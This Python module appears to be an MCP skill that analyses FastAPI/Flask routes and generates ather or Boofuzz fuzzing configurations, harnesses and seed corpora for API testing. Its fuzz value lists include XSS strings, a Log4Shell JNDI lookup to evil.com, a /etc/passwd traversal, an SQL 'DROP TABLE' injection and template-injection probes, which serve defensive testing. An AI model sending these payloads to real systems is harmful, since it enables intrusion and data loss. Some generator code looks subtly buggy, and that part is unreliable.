"""
Fuzzing Configurator

Configures fuzzing for APIs by:
- Analyzing FastAPI/Flask routes
- Identifying input points (query params, body, headers)
- Generating fuzzing configuration for ather/Boofuzz
- Suggesting corpora for fuzzing
- Generating ready-to-run fuzzing harness code
"""

import ast
import re
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from collections import defaultdict


@dataclass
class Endpoint:
    path: str
    methods: List[str]
    query_params: List[str] = field(default_factory=list)
    path_params: List[str] = field(default_factory=list)
    body_params: List[str] = field(default_factory=list)
    headers: List[str] = field(default_factory=list)
    return_type: Optional[str] = None


@dataclass
class InputPoint:
    name: str
    location: str
    type_hint: Optional[str] = None
    required: bool = True
    default: Optional[Any] = None


FASTAPI_TYPE_MAPPING = {
    "int": "integers()",
    "float": "floats()",
    "str": "texts()",
    "bool": "booleans()",
    "list": "lists(integers())",
    "dict": "dictionaries(texts(), text())",
    "bytes": "binary()",
}

DEFAULT_CORPORA = {
    "int": [0, 1, -1, 2147483647, -2147483648, 65535],
    "float": [0.0, 1.0, -1.0, float("inf"), float("-inf"), float("nan")],
    "str": ["", "a", "hello", "test", "admin", "<script>", "${jndi}", "{{7*7}}"],
    "bool": [True, False],
    "list": [[], [1], [1, 2, 3], ["a", "b"]],
    "dict": [{}, {"key": "value"}],
}


def parse_api_endpoints(code: str) -> Dict[str, Any]:
    """Parse FastAPI or Flask routes from source code."""
    endpoints = []

    try:
        tree = ast.parse(code)
    except SyntaxError as e:
        return {"status": "error", "error": f"Syntax error: {e}"}

    framework = detect_framework(code)

    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            endpoint = extract_endpoint_info(node, framework)
            if endpoint:
                endpoints.append(endpoint)

    fastapi_decorator_pattern = re.compile(
        r'@(?:app|router)\.(get|post|put|delete|patch)\s*\(\s*["\']([^"\']+)["\']'
    )
    flask_decorator_pattern = re.compile(
        r'@(?:app|router)\.route\s*\(\s*["\']([^"\']+)["\']\s*(?:,\s*methods\s*=\s*\[([^\]]+)\])?'
    )

    for line in code.split("\n"):
        fastapi_match = fastapi_decorator_pattern.search(line)
        if fastapi_match:
            methods = [fastapi_match.group(1).upper()]
            path = fastapi_match.group(2)
            existing = next((e for e in endpoints if e.path == path), None)
            if existing:
                existing.methods = list(set(existing.methods + methods))

        flask_match = flask_decorator_pattern.search(line)
        if flask_match:
            path = flask_match.group(1)
            methods_str = flask_match.group(2)
            if methods_str:
                methods = [m.strip().strip("\"'") for m in methods_str.split(",")]
            else:
                methods = ["GET"]
            existing = next((e for e in endpoints if e.path == path), None)
            if existing:
                existing.methods = list(set(existing.methods + methods))

    return {
        "status": "success",
        "framework": framework,
        "endpoints": [
            {
                "path": e.path,
                "methods": e.methods,
                "query_params": e.query_params,
                "path_params": e.path_params,
                "body_params": e.body_params,
                "headers": e.headers,
                "return_type": e.return_type,
            }
            for e in endpoints
        ],
    }


def detect_framework(code: str) -> str:
    """Detect if code uses FastAPI or Flask."""
    if "fastapi" in code.lower() or "APIRouter" in code or "@app.get" in code:
        return "fastapi"
    elif "flask" in code.lower() or "@app.route" in code or "Flask(" in code:
        return "flask"
    return "unknown"


def extract_endpoint_info(node: ast.FunctionDef, framework: str) -> Optional[Endpoint]:
    """Extract endpoint information from function definition."""
    methods = []
    path = f"/{node.name}"

    for decorator in node.decorator_list:
        decorator_str = ast.unparse(decorator) if hasattr(ast, "unparse") else ""

        if framework == "fastapi":
            if isinstance(decorator, ast.Call):
                if isinstance(decorator.func, ast.Attribute):
                    if decorator.func.attr in ["get", "post", "put", "delete", "patch"]:
                        methods.append(decorator.func.attr.upper())
                        if decorator.args:
                            path = ast.unparse(decorator.args[0])

        elif framework == "flask":
            if isinstance(decorator, ast.Call):
                if hasattr(decorator.func, "attr") and decorator.func.attr == "route":
                    if decorator.args:
                        path = ast.unparse(decorator.args[0])

    if not methods:
        methods = ["GET"]

    query_params = []
    path_params = []
    body_params = []
    headers = []
    return_type = None

    for arg in node.args.args:
        param_name = arg.arg

        if param_name in ["self", "request"]:
            continue

        param_type = None
        if arg.annotation:
            param_type = (
                ast.unparse(arg.annotation) if hasattr(ast, "unparse") else None
            )

        path_match = re.match(r"\{(\w+)\}", param_name)
        if path_match:
            path_params.append(path_match.group(1))
        elif param_name in ["body", "data", "payload"]:
            body_params.append(param_name)
        elif param_name in ["headers", "header"]:
            headers.append(param_name)
        else:
            query_params.append(param_name)

    if node.returns:
        return_type = ast.unparse(node.returns) if hasattr(ast, "unparse") else None

    return Endpoint(
        path=path,
        methods=methods,
        query_params=query_params,
        path_params=path_params,
        body_params=body_params,
        headers=headers,
        return_type=return_type,
    )


def identify_input_points(endpoints: List[Dict]) -> Dict[str, List[InputPoint]]:
    """Identify all input points for fuzzing from parsed endpoints."""
    inputs = {}

    for endpoint in endpoints:
        path = endpoint["path"]
        input_points = []

        for param in endpoint.get("path_params", []):
            input_points.append(
                InputPoint(
                    name=param,
                    location="path",
                    type_hint="str",
                    required=True,
                )
            )

        for param in endpoint.get("query_params", []):
            input_points.append(
                InputPoint(
                    name=param,
                    location="query",
                    type_hint="str",
                    required=False,
                )
            )

        for param in endpoint.get("body_params", []):
            input_points.append(
                InputPoint(
                    name=param,
                    location="body",
                    type_hint="dict",
                    required=True,
                )
            )

        for param in endpoint.get("headers", []):
            input_points.append(
                InputPoint(
                    name=param,
                    location="header",
                    type_hint="str",
                    required=False,
                )
            )

        inputs[path] = input_points

    return inputs


def generate_ather_config(endpoints: List[Dict], target_url: str) -> Dict[str, Any]:
    """Generate ather fuzzing configuration."""
    fuzzing_config = {
        "tool": "ather",
        "target": target_url,
        "endpoints": [],
        "generators": {},
        "mutations": [],
    }

    for endpoint in endpoints:
        ep_config = {
            "path": endpoint["path"],
            "method": endpoint["methods"][0],
            "parameters": {},
        }

        for param in endpoint.get("query_params", []):
            ep_config["parameters"][param] = {
                "type": "string",
                "fuzz_values": [
                    "",
                    "a" * 10000,
                    "<script>alert(1)</script>",
                    "${jndi:ldap://evil.com/a}",
                ],
            }

        for param in endpoint.get("body_params", []):
            ep_config["parameters"][param] = {
                "type": "object",
                "fuzz_values": [{}, {"key": "<script>"}, {"a" * 1000: "b" * 1000}],
            }

        for param in endpoint.get("headers", []):
            ep_config["parameters"][param] = {
                "type": "string",
                "fuzz_values": ["", "x" * 1000, "{{7*7}}"],
            }

        fuzzing_config["endpoints"].append(ep_config)

    fuzzing_config["generators"] = {
        "string": "Strings().filter(lambda x: len(x) < 10000)",
        "integer": "Integers()",
        "float": "Floats()",
        "boolean": "Booleans()",
    }

    fuzzing_config["mutations"] = [
        "delete_random_character",
        "insert_random_character",
        "swap_random_character",
        "byte_flip",
    ]

    return fuzzing_config


def generate_boofuzz_config(endpoints: List[Dict], target_url: str) -> Dict[str, Any]:
    """Generate Boofuzz fuzzing configuration."""
    fuzzing_config = {
        "tool": "boofuzz",
        "target": target_url,
        "endpoints": [],
        "request_templates": {},
    }

    for endpoint in endpoints:
        ep_config = {
            "path": endpoint["path"],
            "method": endpoint["methods"][0],
            "fields": [],
        }

        for param in endpoint.get("path_params", []):
            ep_config["fields"].append(
                {
                    "name": param,
                    "type": "string",
                    "fuzz_values": ["", "a" * 1000, "{{7*7}}"],
                }
            )

        for param in endpoint.get("query_params", []):
            ep_config["fields"].append(
                {
                    "name": param,
                    "type": "string",
                    "fuzz_values": ["", "test", "admin", "<script>"],
                }
            )

        for param in endpoint.get("body_params", []):
            ep_config["fields"].append(
                {
                    "name": param,
                    "type": "raw",
                    "fuzz_values": [
                        '{"key": "value"}',
                        '{"key": "<script>"}',
                        '{"a": "' + "b" * 1000 + '"}',
                    ],
                }
            )

        for param in endpoint.get("headers", []):
            ep_config["fields"].append(
                {
                    "name": param,
                    "type": "string",
                    "fuzz_values": ["", "x" * 500],
                }
            )

        fuzzing_config["endpoints"].append(ep_config)

    fuzzing_config["request_templates"] = {
        "basic": "s_initialize(name='{name}')",
        "with_params": "s_initialize(name='{name}')\\n    s_string('{value}')",
    }

    return fuzzing_config


def suggest_corpora(endpoints: List[Dict]) -> Dict[str, List[Any]]:
    """Suggest initial corpus values for fuzzing."""
    corpora = defaultdict(list)

    type_corpus = {
        "int": DEFAULT_CORPORA["int"],
        "float": DEFAULT_CORPORA["float"],
        "str": DEFAULT_CORPORA["str"],
        "bool": DEFAULT_CORPORA["bool"],
        "list": DEFAULT_CORPORA["list"],
        "dict": DEFAULT_CORPORA["dict"],
    }

    common_strings = [
        "",
        "a",
        "test",
        "admin",
        "root",
        "null",
        "None",
        "undefined",
        "0",
        "1",
        "-1",
        "0.0",
        "true",
        "false",
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "../../../etc/passwd",
        "'; DROP TABLE users; --",
        "a" * 100,
        "a" * 1000,
        "a" * 10000,
        "\\\x00",
        "\x00",
        "\n" * 100,
        "\t" * 100,
        "中文",
        "日本語",
        "emoji 🎉",
    ]
    corpora["common_strings"] = common_strings

    numeric_values = [
        0,
        1,
        -1,
        255,
        256,
        65535,
        65536,
        2147483647,
        -2147483648,
        0.0,
        1.0,
        -1.0,
        float("inf"),
        float("-inf"),
        float("nan"),
    ]
    corpora["numeric_values"] = numeric_values

    for endpoint in endpoints:
        for param in endpoint.get("query_params", []):
            if param not in corpora["query_params"]:
                corpora["query_params"].append(
                    {
                        "name": param,
                        "type": "string",
                        "values": common_strings[:10],
                    }
                )

        for param in endpoint.get("body_params", []):
            if param not in corpora["body_params"]:
                corpora["body_params"].append(
                    {
                        "name": param,
                        "type": "object",
                        "values": [
                            {},
                            {"key": "value"},
                            {"key": "<script>"},
                            {"a": "b" * 100},
                        ],
                    }
                )

    return dict(corpora)


def generate_ather_harness(endpoints: List[Dict], target_url: str) -> str:
    """Generate ather fuzzing harness code."""
    harness = (
        '''#!/usr/bin/env python3
"""
Ather Fuzzing Harness
Generated by Fuzzing Configurator
"""

import asyncio
from ather import SyncActor
from ather import Strings, Integers, Floats, Boofuzz

URL = "'''
        + target_url
        + '''"

def create_fuzzing_targets():
    """Define fuzzing targets."""
    targets = []
    
'''
    )

    for i, endpoint in enumerate(endpoints):
        methods = endpoint.get("methods", ["GET"])
        method = methods[0]

        harness += f"""    # Endpoint: {endpoint["path"]} [{method}]
    targets.append((
        "{method}",
        "{endpoint["path"]}",
        {{
"""

        for param in endpoint.get("query_params", []):
            harness += (
                f'            "{param}": Strings(min_length=0, max_length=10000),\n'
            )

        for param in endpoint.get("body_params", []):
            harness += (
                f'            "{param}": Strings(min_length=0, max_length=10000),\n'
            )

        for param in endpoint.get("headers", []):
            harness += (
                f'            "{param}": Strings(min_length=0, max_length=1000),\n'
            )

        harness += """        }
    ))
    
"""

    harness += '''    return targets

async def fuzz_endpoint(method: str, path: str, params: dict):
    """Fuzz a single endpoint."""
    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            url = f"{URL}{path}"
            
            if method == "GET":
                async with session.get(url, params=params) as resp:
                    pass
            elif method == "POST":
                async with session.post(url, json=params) as resp:
                    pass
            elif method == "PUT":
                async with session.put(url, json=params) as resp:
                    pass
            elif method == "DELETE":
                async with session.delete(url, params=params) as resp:
                    pass
            elif method == "PATCH":
                async with session.patch(url, json=params) as resp:
                    pass
                    
    except Exception as e:
        print(f"Error fuzzing {{method}} {{path}}: {{e}}")

async def main():
    """Main fuzzing loop."""
    targets = create_fuzzing_targets()
    
    for method, path, params_template in targets:
        print(f"Fuzzing: {{method}} {{path}}")
        
        actor = SyncActor()
        
        for param_name, generator in params_template.items():
            for value in generator:
                params = {{param_name: value}}
                await fuzz_endpoint(method, path, params)

if __name__ == "__main__":
    asyncio.run(main())
'''

    return harness


def generate_boofuzz_harness(endpoints: List[Dict], target_url: str) -> str:
    """Generate Boofuzz fuzzing harness code."""
    url_parsed = target_url.replace("http://", "").replace("https://", "")
    if "/" in url_parsed:
        host_port, path = url_parsed.split("/", 1)
    else:
        host_port = url_parsed
        path = ""

    if ":" in host_port:
        target_host, target_port_str = host_port.split(":")
        target_port = int(target_port_str)
    else:
        target_host = host_port
        target_port = 80 if "http://" in target_url else 443

    harness = (
        '''#!/usr/bin/env python3
"""
Boofuzz Fuzzing Harness
Generated by Fuzzing Configurator
"""

from boofuzz import *

TARGET_HOST = "'''
        + target_host
        + """"
TARGET_PORT = """
        + str(target_port)
        + '''

def get_basic_auth():
    """Return basic auth if needed."""
    return None


'''
    )

    harness += '''def get_proto_mutations():
    """Get protocol-level mutations."""
    return [
        s_delimiters(),
        s_shrink(),
    ]

'''

    for i, endpoint in enumerate(endpoints):
        methods = endpoint.get("methods", ["GET"])
        method = methods[0]

        harness += f'''def create_request_{i}():
    """Fuzzing request for {endpoint["path"]} [{method}]"""
    req = s_initialize(name="{endpoint["path"].replace("/", "_")}")
    
'''

        for param in endpoint.get("path_params", []):
            harness += f"""    with s_block("path_param_{param}"):
        s_string("{param}", name="{param}")
        s_delimiters()
"""

        for param in endpoint.get("query_params", []):
            harness += f"""    with s_block("query_{param}"):
        s_string("{param}=", name="{param}_key")
        s_string("value", name="{param}_value", fuzzable=True)
"""

        for param in endpoint.get("body_params", []):
            harness += f"""    with s_block("body_{param}"):
        s_string('{{"key": "value"}}', name="{param}", fuzzable=True)
"""

        for param in endpoint.get("headers", []):
            harness += f"""    with s_block("header_{param}"):
        s_string("{param}", name="{param}_key", fuzzable=True)
        s_string("value", name="{param}_value", fuzzable=True)
"""

        harness += "\n"

    harness += """class FuzzingSession:
    def __init__(self):
        self.session = Session(
            target=Target(
                connection=SocketConnection(TARGET_HOST, TARGET_PORT, proto='tcp'),
            ),
        )
    
    def add_requests(self):
"""

    for i in range(len(endpoints)):
        harness += f"        self.session.add_request(create_request_{i})\n"

    harness += '''    
    def run(self):
        self.session.fuzz()

def main():
    """Run fuzzing."""
    fuzzing_session = FuzzingSession()
    fuzzing_session.add_requests()
    fuzzing_session.run()

if __name__ == "__main__":
    main()
'''

    return harness


def fuzzing_configurator(code: str, options: dict) -> dict:
    """
    Configure fuzzing for an API.

    Args:
        code: Python API code (FastAPI or Flask)
        options: Dictionary with:
            - tool: "ather" or "boofuzz"
            - target_url: Target API URL

    Returns:
        Dictionary with:
            - status: "success" or "error"
            - endpoints: Detected endpoints with methods
            - inputs: Input points per endpoint
            - fuzzing_config: Configuration for fuzzing tool
            - harness_code: Generated harness code
            - corpora: Suggested initial corpus values
    """
    if not code:
        return {"status": "error", "error": "No code provided"}

    tool = options.get("tool", "ather")
    target_url = options.get("target_url", "http://localhost:8000")

    parsed = parse_api_endpoints(code)

    if parsed.get("status") != "success":
        return parsed

    endpoints = parsed.get("endpoints", [])

    if not endpoints:
        return {
            "status": "error",
            "error": "No API endpoints detected. Make sure the code contains FastAPI or Flask routes.",
        }

    inputs = identify_input_points(endpoints)

    if tool == "ather":
        fuzzing_config = generate_ather_config(endpoints, target_url)
        harness_code = generate_ather_harness(endpoints, target_url)
    elif tool == "boofuzz":
        fuzzing_config = generate_boofuzz_config(endpoints, target_url)
        harness_code = generate_boofuzz_harness(endpoints, target_url)
    else:
        return {"status": "error", "error": f"Unknown fuzzing tool: {tool}"}

    corpora = suggest_corpora(endpoints)

    return {
        "status": "success",
        "endpoints": endpoints,
        "inputs": {
            path: [
                {
                    "name": inp.name,
                    "location": inp.location,
                    "type_hint": inp.type_hint,
                    "required": inp.required,
                    "default": inp.default,
                }
                for inp in input_points
            ]
            for path, input_points in inputs.items()
        },
        "fuzzing_config": fuzzing_config,
        "harness_code": harness_code,
        "corpora": corpora,
    }


def invoke(payload: dict) -> dict:
    """MCP skill invocation."""
    action = payload.get("action", "configure")
    code = payload.get("code", "")
    options = payload.get("options", {})

    if action == "configure":
        result = fuzzing_configurator(code, options)
    elif action == "parse_endpoints":
        result = parse_api_endpoints(code)
    elif action == "identify_inputs":
        parsed = parse_api_endpoints(code)
        if parsed.get("status") == "success":
            inputs = identify_input_points(parsed.get("endpoints", []))
            result = {"status": "success", "inputs": inputs}
        else:
            result = parsed
    elif action == "suggest_corpora":
        parsed = parse_api_endpoints(code)
        if parsed.get("status") == "success":
            corpora = suggest_corpora(parsed.get("endpoints", []))
            result = {"status": "success", "corpora": corpora}
        else:
            result = parsed
    else:
        result = {"status": "error", "message": f"Unknown action: {action}"}

    return {"result": result}


def register_skill():
    """Return skill metadata."""
    return {
        "name": "fuzzing-configurator",
        "description": "Configures fuzzing for APIs by analyzing FastAPI/Flask routes and generating ather/Boofuzz configurations",
        "version": "1.0.0",
        "domain": "TESTING_QUALITY",
        "capabilities": [
            "fastapi_route_analysis",
            "flask_route_analysis",
            "input_point_identification",
            "ather_config_generation",
            "boofuzz_config_generation",
            "corpus_suggestion",
            "harness_code_generation",
        ],
    }
